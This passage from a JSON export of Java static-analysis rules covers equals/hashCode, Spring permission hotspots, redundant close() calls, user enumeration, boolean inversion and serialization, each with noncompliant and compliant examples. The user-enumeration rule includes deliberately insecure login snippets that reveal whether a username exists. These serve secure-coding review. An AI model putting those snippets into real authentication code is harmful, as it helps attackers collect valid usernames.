            "mdDesc": "<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>\n<blockquote>\n  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two\n  objects must produce the same integer result. </p>\n  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the\n  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>\n  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of\n  hashtables.</p>\n</blockquote>\n<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {    // Noncompliant - should also override \"hashCode()\"\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {    // Compliant\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n  @Override\n  public int hashCode() {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/581.html\">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DVGBQ\">CERT, MET09-J.</a> - Classes that define an equals() method must also define a\n  hashCode() method </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4834",
            "repo": "java",
            "name": "Controlling permissions is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999\">CVE-2018-12999</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285\">CVE-2018-10285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455\">CVE-2017-7455</a> </li>\n</ul>\n<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be\ndone properly.</p>\n<p>This rule flags code that controls the access to resources and actions. The goal is to guide security code reviews.</p>\n<p>More specifically it will raise issues on the following Spring code:</p>\n<ul>\n  <li> The definition of any class implementing interfaces </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionVoter</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionManager</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.AfterInvocationProvider</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.PermissionEvaluator</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.expression.SecurityExpressionOperations</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.expression.method.MethodSecurityExpressionHandler</code></p>\n<p> <strong></strong> <code>org.springframework.security.core.GrantedAuthority</code></p>\n<p> <strong></strong> <code>org.springframework.security.acls.model.PermissionGrantingStrategy</code></p>\n<ul>\n  <li> The definition of any class extending class </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration</code></p>\n<ul>\n  <li> Any method annotated with </li>\n</ul>\n<p> <strong></strong> Pre-post annotations: <code>@PreAuthorize</code>, <code>@PreFilter</code>, <code>@PostAuthorize</code> or\n<code>@PostFilter</code> from <code>org.springframework.security.access.prepost</code> package.</p>\n<p> <strong></strong> <code>@org.springframework.security.access.annotation.Secured</code></p>\n<ul>\n  <li> Calls to any of the following methods </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.acls.model.MutableAclService</code>: <code>createAcl</code>, <code>deleteAcl</code>,\n<code>updateAcl</code></p>\n<p> <strong></strong> <code>org.springframework.security.config.annotation.web.builders.HttpSecurity</code>: <code>authorizeRequests</code></p>\n<ul>\n  <li> The instantiation of an anonymous class implementing <code>org.springframework.security.core.GrantedAuthority</code> or of any class\n  implementing this interface directly. </li>\n</ul>\n<p>It will also raise issue on JSR-250 annotations <code>@RolesAllowed</code>, <code>@PermitAll</code> and <code>@DenyAll</code> from\n<code>javax.annotation.security</code> package.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li>\n  <li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval\n  ...). </li>\n  <li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>At minimum, an access control system should:</p>\n<ul>\n  <li> Use a well-defined access control model like <a href=\"https://en.wikipedia.org/wiki/Role-based_access_control\">RBAC</a> or <a\n  href=\"https://en.wikipedia.org/wiki/Access-control_list\">ACL</a>. </li>\n  <li> Entities' permissions should be reviewed regularly to remove permissions that are no longer needed. </li>\n  <li> Respect <a href=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a> (\"_an entity has access only\n  the information and resources that are necessary for its legitimate purpose_\"). </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/276.html\">MITRE, CWE-276</a> - Incorrect Default Permissions </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/732.html\">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/668.html\">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/277.html\">MITRE, CWE-277</a> - Insecure Inherited Permissions </li>\n</ul>",
            "mdDesc": "<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999\">CVE-2018-12999</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285\">CVE-2018-10285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455\">CVE-2017-7455</a> </li>\n</ul>\n<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be\ndone properly.</p>\n<p>This rule flags code that controls the access to resources and actions. The goal is to guide security code reviews.</p>\n<p>More specifically it will raise issues on the following Spring code:</p>\n<ul>\n  <li> The definition of any class implementing interfaces </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionVoter</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.AccessDecisionManager</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.AfterInvocationProvider</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.PermissionEvaluator</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.expression.SecurityExpressionOperations</code></p>\n<p> <strong></strong> <code>org.springframework.security.access.expression.method.MethodSecurityExpressionHandler</code></p>\n<p> <strong></strong> <code>org.springframework.security.core.GrantedAuthority</code></p>\n<p> <strong></strong> <code>org.springframework.security.acls.model.PermissionGrantingStrategy</code></p>\n<ul>\n  <li> The definition of any class extending class </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration</code></p>\n<ul>\n  <li> Any method annotated with </li>\n</ul>\n<p> <strong></strong> Pre-post annotations: <code>@PreAuthorize</code>, <code>@PreFilter</code>, <code>@PostAuthorize</code> or\n<code>@PostFilter</code> from <code>org.springframework.security.access.prepost</code> package.</p>\n<p> <strong></strong> <code>@org.springframework.security.access.annotation.Secured</code></p>\n<ul>\n  <li> Calls to any of the following methods </li>\n</ul>\n<p> <strong></strong> <code>org.springframework.security.acls.model.MutableAclService</code>: <code>createAcl</code>, <code>deleteAcl</code>,\n<code>updateAcl</code></p>\n<p> <strong></strong> <code>org.springframework.security.config.annotation.web.builders.HttpSecurity</code>: <code>authorizeRequests</code></p>\n<ul>\n  <li> The instantiation of an anonymous class implementing <code>org.springframework.security.core.GrantedAuthority</code> or of any class\n  implementing this interface directly. </li>\n</ul>\n<p>It will also raise issue on JSR-250 annotations <code>@RolesAllowed</code>, <code>@PermitAll</code> and <code>@DenyAll</code> from\n<code>javax.annotation.security</code> package.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li>\n  <li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval\n  ...). </li>\n  <li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>At minimum, an access control system should:</p>\n<ul>\n  <li> Use a well-defined access control model like <a href=\"https://en.wikipedia.org/wiki/Role-based_access_control\">RBAC</a> or <a\n  href=\"https://en.wikipedia.org/wiki/Access-control_list\">ACL</a>. </li>\n  <li> Entities' permissions should be reviewed regularly to remove permissions that are no longer needed. </li>\n  <li> Respect <a href=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a> (\"_an entity has access only\n  the information and resources that are necessary for its legitimate purpose_\"). </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/276.html\">MITRE, CWE-276</a> - Incorrect Default Permissions </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/732.html\">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/668.html\">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/277.html\">MITRE, CWE-277</a> - Insecure Inherited Permissions </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a5",
                "sans-top25-porous",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S4087",
            "repo": "java",
            "name": "\"close()\" calls should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Java 7's try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit\n<code>close()</code> call is redundant and potentially confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n  writer.close();  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n}\n</pre>",
            "mdDesc": "<p>Java 7's try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit\n<code>close()</code> call is redundant and potentially confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n  writer.close();  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5804",
            "repo": "java",
            "name": "Allowing user enumeration is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using\n\"sign-in/sign-on/forgot password\" functionalities of a website.</p>\n<p>When an user tries to \"sign-in\" to a website with an incorrect username/login, the web application should not disclose that the username doesn't\nexist with a message similar to \"this username is incorrect\", instead a generic message should be used like \"bad credentials\", this way it's not\npossible to guess whether the username or password was incorrect during the authentication.</p>\n<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large\namount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc ...).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application discloses that a username exists in its database: most of the time it's possible to avoid this kind of leak except for the\n  \"registration/sign-on\" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>\n  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>\n<ul>\n  <li> Error messages should be generic and not disclose if the username is valid or not. </li>\n  <li> The response time must be similar for a valid username or not. </li>\n  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In a Spring-security web application the username leaks when:</p>\n<ul>\n  <li> The string used as argument of <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html\">loadUserByUsername</a> method is used in an exception message: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  MyUserDetailsService s1 = new MyUserDetailsService();\n  MyUserPrincipal u1 = s1.loadUserByUsername(username);\n\n  if(u1 == null) {\n    throw new BadCredentialsException(username+\" doesn't exist in our database\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html\">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  if(user == null) {\n      throw new UsernameNotFoundException(\"user not found\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> is set to false: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(false); // Sensitive\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the same message should be used regardless of whether it is the wrong user or password: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) throws AuthenticationException {\n  Details user = null;\n  try {\n    user = loadUserByUsername(username);\n  } catch (UsernameNotFoundException | DataAccessException e) {\n    // Hide this exception reason to not disclose that the username doesn't exist\n  }\n  if (user == null || !user.isPasswordCorrect(password)) {\n     // User should not be able to guess if the bad credentials message is related to the username or the password\n    throw new BadCredentialsException(\"Bad credentials\");\n  }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> should be set to true: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(true); // Compliant\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> -\n  Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/200.html\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n</ul>",
            "mdDesc": "<p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using\n\"sign-in/sign-on/forgot password\" functionalities of a website.</p>\n<p>When an user tries to \"sign-in\" to a website with an incorrect username/login, the web application should not disclose that the username doesn't\nexist with a message similar to \"this username is incorrect\", instead a generic message should be used like \"bad credentials\", this way it's not\npossible to guess whether the username or password was incorrect during the authentication.</p>\n<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large\namount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc ...).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application discloses that a username exists in its database: most of the time it's possible to avoid this kind of leak except for the\n  \"registration/sign-on\" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>\n  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>\n<ul>\n  <li> Error messages should be generic and not disclose if the username is valid or not. </li>\n  <li> The response time must be similar for a valid username or not. </li>\n  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In a Spring-security web application the username leaks when:</p>\n<ul>\n  <li> The string used as argument of <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html\">loadUserByUsername</a> method is used in an exception message: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  MyUserDetailsService s1 = new MyUserDetailsService();\n  MyUserPrincipal u1 = s1.loadUserByUsername(username);\n\n  if(u1 == null) {\n    throw new BadCredentialsException(username+\" doesn't exist in our database\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html\">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  if(user == null) {\n      throw new UsernameNotFoundException(\"user not found\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> is set to false: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(false); // Sensitive\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the same message should be used regardless of whether it is the wrong user or password: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) throws AuthenticationException {\n  Details user = null;\n  try {\n    user = loadUserByUsername(username);\n  } catch (UsernameNotFoundException | DataAccessException e) {\n    // Hide this exception reason to not disclose that the username doesn't exist\n  }\n  if (user == null || !user.isPasswordCorrect(password)) {\n     // User should not be able to guess if the bad credentials message is related to the username or the password\n    throw new BadCredentialsException(\"Bad credentials\");\n  }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> should be set to true: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(true); // Compliant\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> -\n  Broken Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/200.html\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a2",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1940",
            "repo": "java",
            "name": "Boolean checks should not be inverted",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( !(a == 2)) { ...}  // Noncompliant\nboolean b = !(i &lt; 10);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (a != 2) { ...}\nboolean b = (i &gt;= 10);\n</pre>",
            "mdDesc": "<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( !(a == 2)) { ...}  // Noncompliant\nboolean b = !(i &lt; 10);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (a != 2) { ...}\nboolean b = (i &gt;= 10);\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1948",
            "repo": "java",
            "name": "Fields in a \"Serializable\" class should either be transient or serializable",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is\nnever explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks flush objects to disk, and an allegedly\n<code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers. In\ngeneral a <code>Serializable</code> class is expected to fulfil its contract and not have an unexpected behaviour when an instance is serialized. </p>\n<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they\ncould be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the\nclass.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;  // Noncompliant; Address isn't serializable\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Address implements Serializable {\n  private static final long serialVersionUID = 2405172041950251807L;\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the\nresponsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>\n<pre>\n private void writeObject(java.io.ObjectOutputStream out)\n     throws IOException\n private void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/594.html\">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk </li>\n  <li> <a href=\"https://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html\">Oracle Java 6, Serializable</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html\">Oracle Java 7, Serializable</a> </li>\n</ul>",
            "mdDesc": "<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is\nnever explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks flush objects to disk, and an allegedly\n<code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers. In\ngeneral a <code>Serializable</code> class is expected to fulfil its contract and not have an unexpected behaviour when an instance is serialized. </p>\n<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they\ncould be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the\nclass.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;  // Noncompliant; Address isn't serializable\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Address implements Serializable {\n  private static final long serialVersionUID = 2405172041950251807L;\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the\nresponsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>\n<pre>\n private void writeObject(java.io.ObjectOutputStream out)\n     throws IOException\n private void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/594.html\">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk </li>\n  <li> <a href=\"https://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html\">Oracle Java 6, Serializable</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html\">Oracle Java 7, Serializable</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "serialization"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1943",
            "repo": "java",
            "name": "Classes and methods that rely on the default system encoding should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
